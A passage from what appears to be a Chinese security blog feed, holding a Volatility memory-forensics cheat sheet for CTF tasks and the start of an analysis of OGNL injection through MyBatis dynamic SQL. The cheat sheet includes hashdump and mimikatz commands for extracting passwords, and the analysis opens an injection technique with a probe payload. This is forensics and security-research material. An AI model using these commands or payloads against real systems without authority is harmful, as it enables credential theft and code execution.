class="hljs-attr">--profile</span>=<span class="hljs-selector-attr">[操作系统]</span> <span class="hljs-selector-attr">[插件参数]</span><br></code></pre></td></tr></table></figure><h6 id="1-判断镜像"><a href="#1-判断镜像" class="headerlink" title="1.判断镜像"></a>1.判断镜像</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 vol.py -f [image] imageinfo<br></code></pre></td></tr></table></figure><h6 id="2-查看用户名密码信息"><a href="#2-查看用户名密码信息" class="headerlink" title="2.查看用户名密码信息"></a>2.查看用户名密码信息</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hashdump<br></code></pre></td></tr></table></figure><h6 id="3-查看进程信息"><a href="#3-查看进程信息" class="headerlink" title="3.查看进程信息"></a>3.查看进程信息</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pslist<br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pstree <span class="hljs-comment">#可以识别子进程和父进程，且可以显示出被隐藏的病毒</span><br></code></pre></td></tr></table></figure><h6 id="4-扫描所有的文件列表"><a href="#4-扫描所有的文件列表" class="headerlink" title="4.扫描所有的文件列表"></a>4.扫描所有的文件列表</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan<br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan | grep flag  <br></code></pre></td></tr></table></figure><h6 id="5-查看cmd上的操作"><a href="#5-查看cmd上的操作" class="headerlink" title="5.查看cmd上的操作"></a>5.查看cmd上的操作</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] cmdscan<br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] cmdline <span class="hljs-comment">#列出命令行下运行的程序</span><br></code></pre></td></tr></table></figure><h6 id="6-查看具体恶意进程"><a href="#6-查看具体恶意进程" class="headerlink" title="6.查看具体恶意进程"></a>6.查看具体恶意进程</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pstree  | egrep <span class="hljs-string">&#x27;(a.exe|b.exe)&#x27;</span>   <span class="hljs-comment">#以树的形式来列出正在进行的进程</span><br></code></pre></td></tr></table></figure><h6 id="7-检查恶意链接"><a href="#7-检查恶意链接" class="headerlink" title="7.检查恶意链接"></a>7.检查恶意链接</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">检查链接插件：vol.py -f &lt;镜像文件&gt; --profile=[profile文件] connections<br>检查端口插件：vol.py -f &lt;镜像文件&gt; --profile=[profile文件] sockets<br></code></pre></td></tr></table></figure><h6 id="8-检测DLL"><a href="#8-检测DLL" class="headerlink" title="8.检测DLL"></a>8.检测DLL</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] dlllist -p[pid]<br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] ldrmodules  -p[pid] -v <span class="hljs-comment">#显示包括隐藏dll的具体信息</span><br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] malfind -p[pid] <span class="hljs-comment">#找出注入的可执行代码或者DLL </span><br><br></code></pre></td></tr></table></figure><h6 id="9-根据PID导出程序"><a href="#9-根据PID导出程序" class="headerlink" title="9.根据PID导出程序"></a>9.根据PID导出程序</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] prodump -p [PID] -D [目录]<br></code></pre></td></tr></table></figure><h6 id="10-检查驱动程序"><a href="#10-检查驱动程序" class="headerlink" title="10.检查驱动程序"></a>10.检查驱动程序</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] modules<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] moddump -D [目录] --base [base地址]  <span class="hljs-comment">#提取驱动程序</span><br></code></pre></td></tr></table></figure><h6 id="11-查看开启的windows服务"><a href="#11-查看开启的windows服务" class="headerlink" title="11.查看开启的windows服务"></a>11.查看开启的windows服务</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] svcscan<br></code></pre></td></tr></table></figure><h6 id="12-查看注册表项"><a href="#12-查看注册表项" class="headerlink" title="12.查看注册表项"></a>12.查看注册表项</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey<br></code></pre></td></tr></table></figure><h6 id="13-列出SAM表中的用户"><a href="#13-列出SAM表中的用户" class="headerlink" title="13.列出SAM表中的用户"></a>13.列出SAM表中的用户</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey -K <span class="hljs-string">&quot;SAM\Domains\Account\Users\Names&quot;</span><br></code></pre></td></tr></table></figure><h6 id="14-获取最后登录系统的用户"><a href="#14-获取最后登录系统的用户" class="headerlink" title="14.获取最后登录系统的用户"></a>14.获取最后登录系统的用户</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey -K <span class="hljs-string">&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure><h6 id="15-查看注册表信息"><a href="#15-查看注册表信息" class="headerlink" title="15.查看注册表信息"></a>15.查看注册表信息</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hivelist<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hivedump -o 0x93fc41e8(注册表的 virtual 地址)  <span class="hljs-comment">#导出注册表</span><br></code></pre></td></tr></table></figure><h6 id="16-获取浏览器浏览历史"><a href="#16-获取浏览器浏览历史" class="headerlink" title="16.获取浏览器浏览历史"></a>16.获取浏览器浏览历史</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] iehistory<br></code></pre></td></tr></table></figure><h6 id="17-查看时间线"><a href="#17-查看时间线" class="headerlink" title="17.查看时间线"></a>17.查看时间线</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] timeliner<br></code></pre></td></tr></table></figure><h6 id="18-抓登录密码"><a href="#18-抓登录密码" class="headerlink" title="18.抓登录密码"></a>18.抓登录密码</h6><p>使用mimikatz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 vol.py --plugins=./volatility/plugins -f /home/kali/Desktop/MISC/volatility-master/win.raw --profile=Win7SP1x64 mimikatz<br></code></pre></td></tr></table></figure><h3 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs">首先确定镜像是何种操作系统的，命令imageinfo即可获取镜像信息。<br><br>需要获取的是计算机在这一时刻运行了哪些进程。<br><br>Volatility提供了众多的分析进程的命令，如pstree、pesscan、pslist……<br><br>filescan命令可以对打开的文件进行扫描。<br><br>命令dumpfile和memdump命令将相关数据导出，然后对导出的数据进行二进制分析。<br><br>简单说只要熟悉Volatility工具的常用命令，并能够对结合其他类型的知识（图片隐写、压缩包分析等）对提取出的文件进行分析，便可轻松解决。<br><br>但当然具体问题具体分析吗  但插件就上面的 <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Misc工具用法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mybatis从SQL注入到OGNL注入</title>
    <link href="/2023/11/07/Mybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/11/07/Mybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="动态SQL"><a href="#动态SQL" class="headerlink" title="动态SQL"></a>动态SQL</h1><p>动态 SQL 是 MyBatis 的强大特性之一，一般而言，如果不使用动态SQL来拼接SQL语句，是比较痛苦的，比如拼接时要确保不能漏空格，还要注意去掉列表最后一个列名的逗号等，但是利用动态 SQL，就可以彻底摆脱这种痛苦。</p><p>一般而言，使用mybatis有两种配置，一种是通过xml文件的方式来配置，另一种是通过注解的方式来配置。</p><h2 id="1、xml文件"><a href="#1、xml文件" class="headerlink" title="1、xml文件"></a>1、xml文件</h2><p>mybatis的*mapper.xml文件里能够使用动态SQL的标签有4种，分别是：</p><h3 id="①-if"><a href="#①-if" class="headerlink" title="① if"></a><strong>① if</strong></h3><p>if标签是Mybatis中使用动态SQL比较频繁的地方，尤其是在where的判断里，比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findActiveBlogWithTitleLike&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Blog&quot;</span>&gt;</span><br>  SELECT * FROM BLOG WHERE state = &#x27;ACTIVE&#x27;<br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;title != null&quot;</span>&gt;</span><br>    AND title like #&#123;title&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里的SQL语句就提供了选择情景，如果我们不传入title或者传入的title为空，那么就不会拼接 AND title like #{title}</p><p>又或者想加入额外的判断：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findActiveBlogLike&quot;</span></span><br><span class="hljs-tag">     <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Blog&quot;</span>&gt;</span><br>  SELECT * FROM BLOG WHERE state = &#x27;ACTIVE&#x27;<br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;title != null&quot;</span>&gt;</span><br>    AND title like #&#123;title&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;author != null and author.name != null&quot;</span>&gt;</span><br>    AND author_name like #&#123;author.name&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>结论：if标签里的 test属性，可以插入并解析OGNL表达式</strong></p><h3 id="②-choose-when-otherwise"><a href="#②-choose-when-otherwise" class="headerlink" title="② choose (when, otherwise)"></a><strong>② choose (when, otherwise)</strong></h3><p>根据官方文档中的说明</p><p>有时候，我们不想使用所有的条件，而只是想从多个条件中选择一个使用。针对这种情况，MyBatis 提供了 choose 元素，它有点像 Java 中的 switch 语句。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findActiveBlogLike&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Blog&quot;</span>&gt;</span><br>  SELECT * FROM BLOG WHERE state = &#x27;ACTIVE&#x27;<br>  <span class="hljs-tag">&lt;<span class="hljs-name">choose</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">when</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;title != null&quot;</span>&gt;</span><br>      AND title like #&#123;title&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">when</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">when</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;author != null and author.name != null&quot;</span>&gt;</span><br>      AND author_name like #&#123;author.name&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">when</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">otherwise</span>&gt;</span><br>      AND featured = 1<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">otherwise</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">choose</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>结论：when标签里的 test属性，可以插入并解析OGNL表达式</strong></p><h3 id="③-trim-where-set"><a href="#③-trim-where-set" class="headerlink" title="③ trim (where, set)"></a><strong>③ trim (where, set)</strong></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findActiveBlogLike&quot;</span>  <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Blog&quot;</span>&gt;</span><br>  SELECT * FROM BLOG WHERE<br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;state != null&quot;</span>&gt;</span><br>    state = #&#123;state&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;title != null&quot;</span>&gt;</span><br>    AND title like #&#123;title&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;author != null and author.name != null&quot;</span>&gt;</span><br>    AND author_name like #&#123;author.name&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看下这个SQL语句，假设如果没有满足匹配的条件，那么最终这条 SQL 会变成这样：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> BLOG<br><span class="hljs-keyword">WHERE</span><br></code></pre></td></tr></table></figure><p>毫无疑问，这会导致查询失败</p><p>同样的，如果匹配的只是第二个条件，这条 SQL 会是这样：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> BLOG<br><span class="hljs-keyword">WHERE</span><br><span class="hljs-keyword">AND</span> <span class="hljs-built_in">title</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;someTitle&#x27;</span><br></code></pre></td></tr></table></figure><p>这个查询也会失败</p><p>所以mybatis提出来了trim方法，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findActiveBlogLike&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Blog&quot;</span>&gt;</span><br>  SELECT * FROM BLOG<br>  <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;state != null&quot;</span>&gt;</span><br>         state = #&#123;state&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;title != null&quot;</span>&gt;</span><br>        AND title like #&#123;title&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;author != null and author.name != null&quot;</span>&gt;</span><br>        AND author_name like #&#123;author.name&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到多了一个where标签，同理还有一个set标签</p><p><strong>结论：该情况下，一般没有地方可以供我们插入OGNL表达式</strong></p><h3 id="④-foreach"><a href="#④-foreach" class="headerlink" title="④ foreach"></a><strong>④ foreach</strong></h3><p>动态 SQL 的另一个常见使用场景是对集合进行遍历（尤其是在构建 IN 条件语句的时候）。比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectPostIn&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;domain.blog.Post&quot;</span>&gt;</span><br>  SELECT *<br>  FROM POST P<br>  <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;item&quot;</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;index&quot;</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;list&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;ID in (&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span> <span class="hljs-attr">nullable</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>          #&#123;item&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>结论：该情况下，一般没有地方可以供我们插入OGNL表达式</strong></p><h3 id="⑤-bind"><a href="#⑤-bind" class="headerlink" title="⑤ bind"></a><strong>⑤ bind</strong></h3><p>bind 标签允许我们在 OGNL 表达式以外创建一个变量，并将其绑定到当前的上下文。比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectBlogsLike&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Blog&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bind</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pattern&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;%&#x27; + _parameter.getTitle() + &#x27;%&#x27;&quot;</span> /&gt;</span><br>  SELECT * FROM BLOG<br>  WHERE title LIKE #&#123;pattern&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>结论：bind标签里的 value属性，可以插入并解析OGNL表达式</strong></p><h2 id="2、注解"><a href="#2、注解" class="headerlink" title="2、注解"></a>2、注解</h2><p>springboot使我们摆脱了各种xml配置的烦恼，对应的，mybatis也为springboot提供了对应的注解来满足动态SQL的功能，主要有以下注解：</p><ul><li>@Insert</li><li>@Update</li><li>@Delete</li><li>@Select</li><li>@InsertProvider</li><li>@SelectProvider</li><li>@UpdateProvider</li><li>@DeleteProvider</li></ul><p>@Insert、@Update、@Delete和@Select这四个注解对应的是数据库增删改查功能，每一个都有一个对应的Provider注解标识</p><p>带有Provider注解和不带有Provider注解的区别是，使用Provider需要自己实现查询类，并且使用动态SQL也简单很多。</p><p>举个例子，如果@Update注解想要实现动态SQL，那么一定要使用<script> 标签，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Update(&#123;&quot;&lt;script&gt;&quot;,</span><br><span class="hljs-meta">      &quot;update Author&quot;,</span><br><span class="hljs-meta">      &quot;  &lt;set&gt;&quot;,</span><br><span class="hljs-meta">      &quot;    &lt;if test=&#x27;username != null&#x27;&gt;username=#&#123;username&#125;,&lt;/if&gt;&quot;,</span><br><span class="hljs-meta">      &quot;    &lt;if test=&#x27;password != null&#x27;&gt;password=#&#123;password&#125;,&lt;/if&gt;&quot;,</span><br><span class="hljs-meta">      &quot;    &lt;if test=&#x27;email != null&#x27;&gt;email=#&#123;email&#125;,&lt;/if&gt;&quot;,</span><br><span class="hljs-meta">      &quot;    &lt;if test=&#x27;bio != null&#x27;&gt;bio=#&#123;bio&#125;&lt;/if&gt;&quot;,</span><br><span class="hljs-meta">      &quot;  &lt;/set&gt;&quot;,</span><br><span class="hljs-meta">      &quot;where id=#&#123;id&#125;&quot;,</span><br><span class="hljs-meta">      &quot;&lt;/script&gt;&quot;&#125;)</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">updateAuthorValues</span><span class="hljs-params">(Author author)</span>;<br></code></pre></td></tr></table></figure><p>可以看到，可以引用xml中的标签，然后来使用动态SQL</p><p>但这样的方式很不美观，而且也有点鸡肋（还不如直接用xml来配置了）</p><p>因此有了各类Provider，如：@<strong>SelectProvider</strong></p><p>我们定义一个查询方法为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@SelectProvider(type = UserDaoProvider.class, method = &quot;findTeacherByName&quot;)</span><br>Teacher <span class="hljs-title function_">findUserByName</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span>;<br></code></pre></td></tr></table></figure><p><strong>SelectProvider</strong> 调用的方法为<strong>findTeacherByName</strong>，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java">  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findTeacherByName</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) map.get(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>            &#123;<br>                SELECT(<span class="hljs-string">&quot;id,email&quot;</span>);<br>                FROM(<span class="hljs-string">&quot;Teacher&quot;</span>);<br>                <span class="hljs-keyword">if</span>(map.get(<span class="hljs-string">&quot;id&quot;</span>)!=<span class="hljs-literal">null</span>)            <br>                WHERE(<span class="hljs-string">&quot;name=#&#123;name&#125;&quot;</span>);<br>            &#125;<br>        &#125;.toString();<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，这种方式没有任何标签，但是同样实现了动态SQL</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="场景分析"><a href="#场景分析" class="headerlink" title="场景分析"></a>场景分析</h2><p>前面说了动态SQL的基础知识，可以看到，主要就一个点，在动态SQL中，可以解析OGNL表达式</p><p>那么是不是说，如果我们控制了一个变量，并且该变量可以被解析成OGNL表达式，是不是就能够实现OGNL表达式注入呢？</p><p>答案是肯定的。</p><p>经过研究，总结出变量可以被解析成OGNL表达式，主要有以下几个地方：</p><ol><li><strong>if标签里的 test属性</strong></li></ol><p>此属性一般写死，<strong>不可控</strong></p><ol><li><strong>when标签里的 test属性</strong></li></ol><p>此属性一般写死，<strong>不可控</strong></p><ol><li><strong>bind标签里的 value 属性</strong></li></ol><p>bind标签value属性是可以传值的，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs XML"><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;name != null and name !=&#x27;&#x27;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bind</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;likename&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span><br>       name like #&#123;likename&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但经过测试发现，这里进行OGNL表达式解析的时候，是有顺序的</p><p>假设令name的值为：**${@java.lang.Math@min(4,10)}**</p><p>我们想要的执行顺序是这样的：</p><p>先利用OGNL表达式解析器来获取**${@java.lang.Math@min(4,10)}**的值，得到值以后，再将其赋给bind标签中的value，即：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs XML"><span class="hljs-tag">&lt;<span class="hljs-name">bind</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;likename&quot;</span> <span 